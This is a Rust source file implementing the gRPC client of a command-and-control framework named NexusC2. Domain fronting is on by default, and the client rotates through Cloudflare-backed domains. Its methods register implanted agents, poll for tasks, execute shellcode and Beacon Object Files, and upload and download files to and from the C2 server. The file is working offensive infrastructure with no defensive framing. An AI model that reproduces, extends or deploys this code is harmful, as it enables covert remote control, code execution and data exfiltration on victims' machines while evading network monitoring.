//! gRPC client with enhanced TLS and domain fronting support

use crate::{InfraError, InfraResult, proto::*, CertManager, DomainManager};
use log::{info, warn, debug, error};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::RwLock;
use tokio::time::{sleep, timeout, Duration as TokioDuration};
use tonic::{
    transport::{Channel, ClientTlsConfig, Endpoint},
    Request, Response, Status,
};

/// Connection status for the gRPC client
#[derive(Debug, Clone, PartialEq)]
pub enum ConnectionStatus {
    Disconnected,
    Connecting,
    Connected,
    Reconnecting,
    Failed(String),
}

/// gRPC client configuration
#[derive(Debug, Clone)]
pub struct GrpcClientConfig {
    pub connect_timeout: Duration,
    pub request_timeout: Duration,
    pub max_retry_attempts: u32,
    pub retry_delay: Duration,
    pub keepalive_interval: Duration,
    pub domain_fronting: bool,
    pub custom_headers: std::collections::HashMap<String, String>,
}

impl Default for GrpcClientConfig {
    fn default() -> Self {
        Self {
            connect_timeout: Duration::from_secs(10),
            request_timeout: Duration::from_secs(30),
            max_retry_attempts: 3,
            retry_delay: Duration::from_secs(5),
            keepalive_interval: Duration::from_secs(60),
            domain_fronting: true,
            custom_headers: std::collections::HashMap::new(),
        }
    }
}

/// Enhanced gRPC client with domain rotation and certificate management
pub struct GrpcClient {
    config: GrpcClientConfig,
    cert_manager: Arc<CertManager>,
    domain_manager: Arc<DomainManager>,
    client: Arc<RwLock<Option<nexus_c2_client::NexusC2Client<Channel>>>>,
    connection_status: Arc<RwLock<ConnectionStatus>>,
    current_endpoint: Arc<RwLock<Option<String>>>,
}

impl GrpcClient {
    /// Create a new gRPC client
    pub fn new(
        config: GrpcClientConfig,
        cert_manager: Arc<CertManager>,
        domain_manager: Arc<DomainManager>,
    ) -> Self {
        Self {
            config,
            cert_manager,
            domain_manager,
            client: Arc::new(RwLock::new(None)),
            connection_status: Arc::new(RwLock::new(ConnectionStatus::Disconnected)),
            current_endpoint: Arc::new(RwLock::new(None)),
        }
    }
    
    /// Connect to the gRPC server with automatic domain selection
    pub async fn connect(&self) -> InfraResult<()> {
        info!("Initiating gRPC connection");
        *self.connection_status.write().await = ConnectionStatus::Connecting;
        
        // Get an active domain
        let domain = self.domain_manager.get_random_active_domain().await
            .ok_or_else(|| InfraError::GrpcError("No active domains available".to_string()))?;
        
        let endpoint_url = format!("https://{}:443", domain.full_domain);
        info!("Connecting to endpoint: {}", endpoint_url);
        
        // Create TLS connector with certificate verification
        let tls_connector = self.cert_manager.create_tls_connector(!self.config.domain_fronting)?;
        
        // Configure endpoint with TLS and timeouts
        let mut endpoint = Endpoint::from_shared(endpoint_url.clone())
            .map_err(|e| InfraError::GrpcError(format!("Invalid endpoint: {}", e)))?
            .connect_timeout(self.config.connect_timeout)
            .timeout(self.config.request_timeout)
            .keep_alive_timeout(self.config.keepalive_interval);
        
        // Configure TLS
        let mut tls_config = ClientTlsConfig::new();
        
        if self.config.domain_fronting {
            // For domain fronting, we may need to override SNI
            tls_config = tls_config.domain_name(&domain.full_domain);
        }
        
        // Add custom headers for domain fronting
        if !self.config.custom_headers.is_empty() {
            debug!("Adding custom headers for domain fronting");
        }
        
        endpoint = endpoint.tls_config(tls_config)
            .map_err(|e| InfraError::TlsError(format!("TLS config error: {}", e)))?;
        
        // Establish connection with retry logic
        let channel = self.connect_with_retry(endpoint).await?;
        
        // Create gRPC client
        let grpc_client = nexus_c2_client::NexusC2Client::new(channel);
        
        // Store client and update status
        *self.client.write().await = Some(grpc_client);
        *self.connection_status.write().await = ConnectionStatus::Connected;
        *self.current_endpoint.write().await = Some(endpoint_url);
        
        info!("Successfully connected to gRPC server");
        Ok(())
    }
    
    /// Connect with retry logic and exponential backoff
    async fn connect_with_retry(&self, endpoint: Endpoint) -> InfraResult<Channel> {
        let mut attempt = 0;
        let mut last_error = InfraError::GrpcError("No attempts made".to_string());
        
        while attempt < self.config.max_retry_attempts {
            attempt += 1;
            debug!("Connection attempt {} of {}", attempt, self.config.max_retry_attempts);
            
            match timeout(self.config.connect_timeout, endpoint.connect()).await {
                Ok(Ok(channel)) => {
                    info!("Connection established on attempt {}", attempt);
                    return Ok(channel);
                }
                Ok(Err(e)) => {
                    last_error = InfraError::GrpcError(format!("Connection failed: {}", e));
                    warn!("Connection attempt {} failed: {}", attempt, e);
                }
                Err(_) => {
                    last_error = InfraError::GrpcError("Connection timeout".to_string());
                    warn!("Connection attempt {} timed out", attempt);
                }
            }
            
            if attempt < self.config.max_retry_attempts {
                let delay = self.config.retry_delay * attempt; // Exponential backoff
                debug!("Waiting {:?} before retry", delay);
                sleep(TokioDuration::from_secs(delay.as_secs())).await;
            }
        }
        
        *self.connection_status.write().await = ConnectionStatus::Failed(last_error.to_string());
        Err(last_error)
    }
    
    /// Disconnect from the gRPC server
    pub async fn disconnect(&self) {
        info!("Disconnecting gRPC client");
        *self.client.write().await = None;
        *self.connection_status.write().await = ConnectionStatus::Disconnected;
        *self.current_endpoint.write().await = None;
    }
    
    /// Check if client is connected
    pub async fn is_connected(&self) -> bool {
        matches!(*self.connection_status.read().await, ConnectionStatus::Connected)
    }
    
    /// Get current connection status
    pub async fn get_connection_status(&self) -> ConnectionStatus {
        self.connection_status.read().await.clone()
    }
    
    /// Register agent with the C2 server
    pub async fn register_agent(&self, request: RegistrationRequest) -> InfraResult<RegistrationResponse> {
        info!("Registering agent with C2 server");
        
        let mut client = self.get_client().await?;
        let response = client
            .register_agent(Request::new(request))
            .await
            .map_err(|e| InfraError::GrpcError(format!("Registration failed: {}", e)))?;
        
        let registration_response = response.into_inner();
        
        if registration_response.success {
            info!("Agent registration successful: {}", registration_response.agent_id);
        } else {
            warn!("Agent registration failed: {}", registration_response.message);
        }
        
        Ok(registration_response)
    }
    
    /// Send heartbeat to the C2 server
    pub async fn heartbeat(&self, request: HeartbeatRequest) -> InfraResult<HeartbeatResponse> {
        debug!("Sending heartbeat for agent: {}", request.agent_id);
        
        let mut client = self.get_client().await?;
        let response = client
            .heartbeat(Request::new(request))
            .await
            .map_err(|e| InfraError::GrpcError(format!("Heartbeat failed: {}", e)))?;
        
        Ok(response.into_inner())
    }
    
    /// Get tasks from the C2 server
    pub async fn get_tasks(&self, request: TaskRequest) -> InfraResult<Vec<Task>> {
        debug!("Requesting tasks for agent: {}", request.agent_id);
        
        let mut client = self.get_client().await?;
        let mut stream = client
            .get_tasks(Request::new(request))
            .await
            .map_err(|e| InfraError::GrpcError(format!("Get tasks failed: {}", e)))?
            .into_inner();
        
        let mut tasks = Vec::new();
        while let Some(task) = stream.message().await
            .map_err(|e| InfraError::GrpcError(format!("Stream error: {}", e)))? {
            tasks.push(task);
        }
        
        debug!("Received {} tasks", tasks.len());
        Ok(tasks)
    }
    
    /// Submit task result to the C2 server
    pub async fn submit_task_result(&self, request: TaskResult) -> InfraResult<TaskResultResponse> {
        debug!("Submitting task result for task: {}", request.task_id);
        
        let mut client = self.get_client().await?;
        let response = client
            .submit_task_result(Request::new(request))
            .await
            .map_err(|e| InfraError::GrpcError(format!("Submit result failed: {}", e)))?;
        
        Ok(response.into_inner())
    }
    
    /// Execute shellcode via gRPC
    pub async fn execute_shellcode(&self, request: ShellcodeRequest) -> InfraResult<ShellcodeResponse> {
        info!("Executing shellcode via gRPC for agent: {}", request.agent_id);
        
        let mut client = self.get_client().await?;
        let response = client
            .execute_shellcode(Request::new(request))
            .await
            .map_err(|e| InfraError::GrpcError(format!("Shellcode execution failed: {}", e)))?;
        
        Ok(response.into_inner())
    }
    
    /// Execute BOF via gRPC
    pub async fn execute_bof(&self, request: BofRequest) -> InfraResult<BofResponse> {
        info!("Executing BOF via gRPC for agent: {}", request.agent_id);
        
        let mut client = self.get_client().await?;
        let response = client
            .execute_bof(Request::new(request))
            .await
            .map_err(|e| InfraError::GrpcError(format!("BOF execution failed: {}", e)))?;
        
        Ok(response.into_inner())
    }
    
    /// Upload file to C2 server
    pub async fn upload_file(&self, file_chunks: Vec<FileChunk>) -> InfraResult<FileUploadResponse> {
        info!("Uploading file with {} chunks", file_chunks.len());
        
        let mut client = self.get_client().await?;
        
        // Create stream of file chunks
        let outbound = async_stream::stream! {
            for chunk in file_chunks {
                yield chunk;
            }
        };
        
        let response = client
            .upload_file(Request::new(outbound))
            .await
            .map_err(|e| InfraError::GrpcError(format!("File upload failed: {}", e)))?;
        
        Ok(response.into_inner())
    }
    
    /// Download file from C2 server
    pub async fn download_file(&self, request: FileDownloadRequest) -> InfraResult<Vec<FileChunk>> {
        info!("Downloading file: {}", request.file_path);
        
        let mut client = self.get_client().await?;
        let mut stream = client
            .download_file(Request::new(request))
            .await
            .map_err(|e| InfraError::GrpcError(format!("File download failed: {}", e)))?
            .into_inner();
        
        let mut chunks = Vec::new();
        while let Some(chunk) = stream.message().await
            .map_err(|e| InfraError::GrpcError(format!("Stream error: {}", e)))? {
            chunks.push(chunk);
        }
        
        info!("Downloaded {} file chunks", chunks.len());
        Ok(chunks)
    }
    
    /// Rotate to a new domain endpoint
    pub async fn rotate_endpoint(&self) -> InfraResult<()> {
        info!("Rotating to new domain endpoint");
        
        // Get current connection status
        let current_status = self.connection_status.read().await.clone();
        if !matches!(current_status, ConnectionStatus::Connected) {
            return Err(InfraError::GrpcError("Not currently connected".to_string()));
        }
        
        // Disconnect current client
        self.disconnect().await;
        
        // Reconnect with new domain
        self.connect().await?;
        
        info!("Successfully rotated to new endpoint");
        Ok(())
    }
    
    /// Get client with connection check
    async fn get_client(&self) -> InfraResult<nexus_c2_client::NexusC2Client<Channel>> {
        let client_guard = self.client.read().await;
        match client_guard.as_ref() {
            Some(client) => Ok(client.clone()),
            None => {
                drop(client_guard);
                // Try to auto-reconnect
                self.connect().await?;
                let client_guard = self.client.read().await;
                client_guard
                    .as_ref()
                    .ok_or_else(|| InfraError::GrpcError("Failed to establish connection".to_string()))
                    .map(|c| c.clone())
            }
        }
    }
    
    /// Perform health check on current connection
    pub async fn health_check(&self) -> InfraResult<bool> {
        if !self.is_connected().await {
            return Ok(false);
        }
        
        // Try a simple operation to test connection
        let test_request = HeartbeatRequest {
            agent_id: "health-check".to_string(),
            status: None,
            task_statuses: vec![],
        };
        
        match self.heartbeat(test_request).await {
            Ok(_) => Ok(true),
            Err(_) => {
                warn!("Health check failed, marking connection as failed");
                *self.connection_status.write().await = ConnectionStatus::Failed("Health check failed".to_string());
                Ok(false)
            }
        }
    }
    
    /// Get current endpoint
    pub async fn get_current_endpoint(&self) -> Option<String> {
        self.current_endpoint.read().await.clone()
    }
    
    /// Update client configuration
    pub async fn update_config(&mut self, new_config: GrpcClientConfig) {
        info!("Updating gRPC client configuration");
        self.config = new_config;
        
        // Reconnect with new configuration if currently connected
        if self.is_connected().await {
            if let Err(e) = self.rotate_endpoint().await {
                warn!("Failed to apply new configuration: {}", e);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use tempfile::tempdir;
    use crate::{OriginCertConfig, DomainConfig, CloudflareConfig, CloudflareManager};

    #[tokio::test]
    async fn test_grpc_client_creation() {
        let temp_dir = tempdir().unwrap();
        let cert_config = OriginCertConfig {
            cert_path: temp_dir.path().join("cert.pem"),
            key_path: temp_dir.path().join("key.pem"),
            ca_cert_path: temp_dir.path().join("ca.pem"),
            pin_validation: true,
            validity_days: 365,
        };
        
        // Generate test certificates
        let (cert_pem, key_pem) = crate::CertManager::generate_self_signed_cert(
            "test.example.com",
            &[],
            30
        ).unwrap();
        
        std::fs::write(&cert_config.cert_path, &cert_pem).unwrap();
        std::fs::write(&cert_config.key_path, &key_pem).unwrap();
        std::fs::write(&cert_config.ca_cert_path, &cert_pem).unwrap();
        
        let cert_manager = Arc::new(crate::CertManager::new(cert_config).unwrap());
        
        let domain_config = DomainConfig::default();
        let cf_config = CloudflareConfig::default();
        let cf_manager = CloudflareManager::new(cf_config).unwrap();
        let domain_manager = Arc::new(crate::DomainManager::new(domain_config, cf_manager).await.unwrap());
        
        let client_config = GrpcClientConfig::default();
        let _grpc_client = GrpcClient::new(client_config, cert_manager, domain_manager);
        
        // Client creation should succeed
    }

    #[test]
    fn test_connection_status() {
        assert_eq!(ConnectionStatus::Connected, ConnectionStatus::Connected);
        assert_ne!(ConnectionStatus::Connected, ConnectionStatus::Disconnected);
        
        if let ConnectionStatus::Failed(msg) = ConnectionStatus::Failed("test".to_string()) {
            assert_eq!(msg, "test");
        } else {
            panic!("Expected Failed status");
        }
    }

    #[test]
    fn test_grpc_client_config_default() {
        let config = GrpcClientConfig::default();
        assert_eq!(config.connect_timeout, Duration::from_secs(10));
        assert_eq!(config.max_retry_attempts, 3);
        assert!(config.domain_fronting);
    }
}
